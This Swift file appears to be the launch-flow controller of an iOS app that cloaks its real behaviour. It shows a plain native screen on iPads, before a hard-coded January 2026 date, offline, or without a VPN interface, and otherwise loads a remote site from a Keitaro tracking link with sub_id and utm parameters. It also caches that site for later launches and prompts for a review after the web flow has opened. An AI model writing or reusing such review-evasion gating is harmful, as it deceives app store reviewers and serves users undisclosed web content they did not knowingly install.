import Foundation
import SwiftUI
import Combine
import SystemConfiguration
@MainActor
final class AppFlowManager: ObservableObject {
    // Campaign flow states
    enum Destination: Equatable {
        case loading
        case native
        case site(URL?)
    }
    
    @Published private(set) var destination: Destination = .loading
    @Published var shouldRequestReview: Bool = false
    
    private let linkGateway: LinkGatewayProtocol
    private let userDefaults: UserDefaults
    
    private let thresholdDate: Date = {
        var components = DateComponents()
        components.day = 30
        components.month = 1
        components.year = 2026
        components.calendar = Calendar(identifier: .gregorian)
        components.timeZone = TimeZone(secondsFromGMT: 0)
        return components.date ?? Date(timeIntervalSince1970: 0)
    }()
    
    init(linkGateway: LinkGatewayProtocol = LinkGateway(), userDefaults: UserDefaults = .standard) {
        self.linkGateway = linkGateway
        self.userDefaults = userDefaults
    }
    
    func start() {
        Task { await resolveFlow() }
    }
    
    private func resolveFlow() async {
        destination = .loading
        incrementLaunchCount()
        print("[FLOW] resolveFlow start. launchCount=\(launchCount())")
        
        if userDefaults.bool(forKey: Keys.enforceNative) {
            print("[FLOW] enforceNative=true → Native")
            destination = .native
            considerReviewIfNeeded()
            return
        }
        
        // iPad rule
        if UIDevice.current.model == "iPad" {
            print("[FLOW] iPad detected → Native & enforceNative set")
            userDefaults.set(true, forKey: Keys.enforceNative)
            destination = .native
            considerReviewIfNeeded()
            return
        }
        
        // Date rule
        if Date() < thresholdDate {
            print("[FLOW] Date rule active (now < threshold \(thresholdDate)) → Native & enforceNative set")
            userDefaults.set(true, forKey: Keys.enforceNative)
            destination = .native
            considerReviewIfNeeded()
            return
        }
        
        // Network availability rule
        // If no internet at launch and user has opened web flow before → open empty WebView (do not lose user)
        if await hasInternetConnectivity() == false {
            let hasOpenedBefore = userDefaults.bool(forKey: Keys.hasOpenedSiteOnce)
            if hasOpenedBefore {
                print("[FLOW] No internet, but hasOpenedSiteOnce=true → Open empty WebView (site(nil))")
                destination = .site(nil)
                considerReviewIfNeeded()
                return
            } else {
                print("[FLOW] No internet connectivity detected → Native (white) this launch")
                destination = .native
                considerReviewIfNeeded()
                return
            }
        }
        
        // Optional VPN interface best-effort check (no region detection)
        let vpnIface = hasVPNInterface()
        print("[FLOW] VPN pre-check: iface=\(vpnIface)")
        if vpnIface == false {
            print("[FLOW] VPN not active → Native (white) this launch")
            destination = .native
            considerReviewIfNeeded()
            return
        }

        let savedLink = userDefaults.string(forKey: Keys.savedResourceURL)
        let savedPathid = userDefaults.string(forKey: Keys.savedPathid)
        print("[FLOW] savedLink=\(savedLink ?? "nil"), savedPathid=\(savedPathid ?? "nil")")
        
        if let savedURLString = savedLink, let savedURL = URL(string: savedURLString) {
            // CASE 2.2: Link exists (second and subsequent launches)
            await handleExistingLink(savedURL: savedURL, savedPathid: savedPathid)
        } else {
            // CASE 2.1: No link (first launch)
            await handleFirstLaunch()
        }
        
        considerReviewIfNeeded()
    }
    
  
    private func handleFirstLaunch() async {
        
        // Step 1: Open Keitaro start link with subs (or saved subs if present)
        let defaultSubs = [URLQueryItem(name: "sub_id_1", value: "60"), URLQueryItem(name: "sub_id_2", value: "40")]
        let initialSubs = loadSavedSubQueryItems() ?? defaultSubs
        print("[FLOW] ✅ First launch → request initial resource with subs: \(initialSubs)")
        let (finalURL, pathid) = await linkGateway.fetchInitialResource(queryItems: initialSubs)
        print("[FLOW] Gateway result: url=\(finalURL?.absoluteString ?? "nil"), pathid=\(pathid ?? "nil")")
        if let url = finalURL {
            saveURLAndSubs(url)
            if let pid = pathid, !pid.isEmpty { userDefaults.set(pid, forKey: Keys.savedPathid) }
            userDefaults.set(true, forKey: Keys.hasOpenedSiteOnce)
            if launchCount() == 1 { userDefaults.set(true, forKey: Keys.openedSiteOnFirstLaunch) }
            destination = .site(url)
            return
        }
        // Save pathid if resolved even when no external URL
        if let pid = pathid, !pid.isEmpty { userDefaults.set(pid, forKey: Keys.savedPathid) }
        
        print("[FLOW] No URL available → Native (white)")
        userDefaults.set(true, forKey: Keys.enforceNative)
        destination = .native
    }
    

    private func handleExistingLink(savedURL: URL, savedPathid: String?) async {
        print("[FLOW] Existing link path. savedURL=\(savedURL.absoluteString), savedPathid=\(savedPathid ?? "nil")")
        
        // Step 1: Check if savedURL is still valid
        let isValid = await checkURLStatus(savedURL)
        
        if isValid {
            // Saved URL is still valid (status <= 403), use it
            print("[FLOW] Saved URL is valid, using it")
            destination = .site(savedURL)
            return
        }
        
        // Step 2: Saved URL is invalid (status > 403), try to refresh using pathid
        print("[FLOW] Saved URL invalid (status > 403), trying pathid refresh")
        if let pathToOpen = savedPathid, !pathToOpen.isEmpty,
           let newURL = await linkGateway.fetchResourceWithPathid(pathToOpen) {
            saveURLAndSubs(newURL)
            destination = .site(newURL)
            return
        }
        
        // Step 3: Fallback to initial resource request
        let (fallbackURL, pid) = await linkGateway.fetchInitialResource(queryItems: loadSavedSubQueryItems())
        if let url = fallbackURL {
            saveURLAndSubs(url)
            if let pid = pid, !pid.isEmpty { userDefaults.set(pid, forKey: Keys.savedPathid) }
            destination = .site(url)
            return
        }
        // Even if URL is nil, persist newly learned pathid (if any)
        if let pid = pid, !pid.isEmpty { userDefaults.set(pid, forKey: Keys.savedPathid) }
        destination = .site(savedURL)
        return
    }
    
    // MARK: - Check URL Status
    private func checkURLStatus(_ url: URL) async -> Bool {
        var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: 20)
        request.httpMethod = "GET"
        let session = URLSession(configuration: .ephemeral, delegate: nil, delegateQueue: nil)
        
        do {
            let (_, response) = try await session.data(for: request)
            if let http = response as? HTTPURLResponse {
                let isValid = http.statusCode <= 403
                print("[FLOW] checkURLStatus url=\(url.absoluteString) status=\(http.statusCode) valid=\(isValid)")
                return isValid
            }
            return false
        } catch {
            print("[FLOW] checkURLStatus error=\(error.localizedDescription) url=\(url.absoluteString)")
            return false
        }
    }
    
    // MARK: - Review
    private func considerReviewIfNeeded() {
        if userDefaults.bool(forKey: Keys.openedSiteOnFirstLaunch) && launchCount() == 2 {
            shouldRequestReview = true
        } else {
            shouldRequestReview = false
        }
    }
    
    // MARK: - Launch Count
    private func incrementLaunchCount() {
        let n = userDefaults.integer(forKey: Keys.launchCount)
        userDefaults.set(n + 1, forKey: Keys.launchCount)
    }
    
    private func launchCount() -> Int {
        return userDefaults.integer(forKey: Keys.launchCount)
    }
    
    // MARK: - Subs persistence
    private func saveURLAndSubs(_ url: URL) {
        userDefaults.set(url.absoluteString, forKey: Keys.savedResourceURL)
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let items = components.queryItems {
            var subs: [String: String] = [:]
            for item in items {
                let nameLower = item.name.lowercased()
                if nameLower.hasPrefix("sub") || nameLower.hasPrefix("utm") {
                    subs[item.name] = item.value ?? ""
                }
            }
            if subs.isEmpty == false {
                userDefaults.set(subs, forKey: Keys.savedSubParams)
            }
        }
    }

    private func loadSavedSubQueryItems() -> [URLQueryItem]? {
        if let dict = userDefaults.dictionary(forKey: Keys.savedSubParams) as? [String: String], dict.isEmpty == false {
            return dict.map { URLQueryItem(name: $0.key, value: $0.value) }
        }
        return nil
    }

    // MARK: - Keys
    private enum Keys {
        static let enforceNative = "flow.enforceNative"
        static let hasOpenedSiteOnce = "flow.hasOpenedSiteOnce"
        static let openedSiteOnFirstLaunch = "flow.openedSiteOnFirstLaunch"
        static let launchCount = "flow.launchCount"
        static let savedResourceURL = "flow.savedResourceURL"
        static let savedPathid = "flow.savedPathid"
        static let savedSubParams = "flow.savedSubParams" // [String: String]
    }
    
    // MARK: - Connectivity Probe (Reachability-based, no external URLs)
    private func hasInternetConnectivity() async -> Bool {
        var zeroAddress = sockaddr_in()
        zeroAddress.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
        zeroAddress.sin_family = sa_family_t(AF_INET)
        let reachable: Bool = withUnsafePointer(to: &zeroAddress) { ptr in
            ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { addrPtr in
                guard let reachability = SCNetworkReachabilityCreateWithAddress(nil, addrPtr) else { return false }
                var flags = SCNetworkReachabilityFlags()
                if SCNetworkReachabilityGetFlags(reachability, &flags) == false { return false }
                let isReachable = flags.contains(.reachable)
                let needsConnection = flags.contains(.connectionRequired)
                return isReachable && !needsConnection
            }
        }
        print("[NET] reachability reachable=\(reachable)")
        return reachable
    }

    // MARK: - VPN Detection (best-effort)
    private func hasVPNInterface() -> Bool {
        var addresses: UnsafeMutablePointer<ifaddrs>? = nil
        guard getifaddrs(&addresses) == 0, let first = addresses else {
            print("[NET] getifaddrs failed")
            return false
        }
        defer { freeifaddrs(addresses) }
        var ptr = first
        while true {
            let name = String(cString: ptr.pointee.ifa_name)
            // Check for VPN interfaces: classic (ppp, ipsec) and modern (utun)
            if name.hasPrefix("ppp") || name.hasPrefix("ipsec") || name.hasPrefix("utun") {
                print("[NET] VPN interface detected: \(name)")
                return true
            }
            if let next = ptr.pointee.ifa_next {
                ptr = next
            } else {
                break
            }
        }
        return false
    }
}





